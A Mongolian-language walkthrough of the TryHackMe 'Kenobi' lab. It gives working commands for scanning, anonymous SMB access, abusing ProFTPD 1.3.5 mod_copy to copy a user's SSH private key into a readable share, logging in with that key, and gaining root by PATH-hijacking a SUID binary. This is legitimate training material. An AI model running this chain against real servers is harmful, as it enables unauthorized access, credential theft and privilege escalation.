# TryHackMe Kenobi write-up

>

### Зорилго

Kenobi нь Linux серверийн тагнуул, SMB share-аас мэдээлэл авах, ProFTPD-ийн `mod_copy` алдааг ашиглах, SUID binary-аар эрх өсгөх дасгал юм.

Доорх жишээнд зорилтот IP-г `10.201.88.90` гэж ашиглав. Өөрийн өрөөний IP-г `TARGET_IP` хувьсагчид оруулна.

```shell
export TARGET_IP=10.201.88.90
```

### 1. Үйлчилгээнүүдийг тагнах

Бүх TCP портыг скан хийж, service version болон default NSE скриптүүдийг ажиллуулна.

```shell
nmap -sC -sV -p- "$TARGET_IP"
```

Энэ өрөөнд FTP, SSH, SMB, NFS зэрэг үйлчилгээ гарч ирнэ. Өмнөх сканаар SMB-ийн `445/tcp` порт нээлттэй байсан.

| Порт              | Үйлчилгээ     | Дараагийн алхам                            |
| ----------------- | ------------- | ------------------------------------------ |
| `21/tcp`          | FTP / ProFTPD | Version болон `mod_copy` боломжийг шалгана |
| `22/tcp`          | SSH           | Олсон SSH key-гаар нэвтрэхэд ашиглана      |
| `139`, `445/tcp`  | SMB           | Share болон файл жагсаана                  |
| `111`, `2049/tcp` | RPC/NFS       | Export-уудыг шалгана                       |

### 2. SMB share-уудыг шалгах

Нууц үггүйгээр share-уудыг жагсаана.

```shell
smbclient -L "//$TARGET_IP/" -N
```

`anonymous` share байвал доторх файлуудыг татна.

```shell
smbclient "//$TARGET_IP/anonymous" -N
# smb: \> ls
# smb: \> get log.txt
# smb: \> exit
```

`log.txt` файл нь ProFTPD серверийн байршил болон тохиргооны мэдээлэл өгдөг. Ялангуяа `/var` доторх share болон FTP-ийн хувилбарыг тэмдэглэнэ.

### 3. ProFTPD-ээр SSH key-г хуулбарлах

ProFTPD `1.3.5` нь `mod_copy` идэвхтэй үед `SITE CPFR` болон `SITE CPTO` командаар сервер дотор файл хуулж чадна. SSH private key-г SMB-ээр татаж болох байрлал руу хуулна.

```shell
nc "$TARGET_IP" 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
quit
```

`tmp` share-аас key-г авна.

```shell
smbclient "//$TARGET_IP/tmp" -N
# smb: \> get id_rsa
# smb: \> exit
chmod 600 id_rsa
```

### 4. Kenobi хэрэглэгчээр нэвтрэх

Татсан key-г ашиглан SSH сесс нээнэ.

```shell
ssh -i id_rsa kenobi@"$TARGET_IP"
```

Энэ шатанд өрөөний эхний user flag-г шалгаж болно.

```shell
cat ~/user.txt
```

### 5. SUID binary-аар root эрх авах

SUID тохиргоотой файлуудыг хайна.

```shell
find / -type f -perm -04000 -ls 2>/dev/null
```

`/usr/bin/menu` binary нь `curl` командыг бүрэн замгүйгээр дууддаг. `PATH`-д өөрийн `curl` файлыг урд нь оруулж, binary-г дахин ажиллуулна.

```shell
printf '#!/bin/sh\n/bin/sh\n' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

Цэснээс `curl` ашигладаг сонголтыг сонгоно. Shell нь root эрхтэй нээгдсэнийг батална.

```shell
id
cat /root/root.txt
```

### Screenshots

<figure><img src=".gitbook/assets/Screenshot 2025-10-22 162226.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/Screenshot 2025-10-22 162238.png" alt=""><figcaption></figcaption></figure>

###

###
